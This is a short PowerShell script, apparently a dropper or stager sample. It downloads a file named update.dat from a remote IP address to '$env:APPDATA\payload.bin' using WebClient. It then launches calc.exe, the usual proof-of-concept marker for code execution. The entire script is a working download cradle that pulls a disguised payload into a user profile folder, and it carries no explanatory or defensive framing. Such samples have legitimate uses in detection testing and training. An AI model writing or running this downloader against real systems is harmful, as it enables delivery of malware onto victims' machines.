
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://198.51.100.195:443/update.dat',
    [string]$PayloadPath = "$env:APPDATA\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $PayloadPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
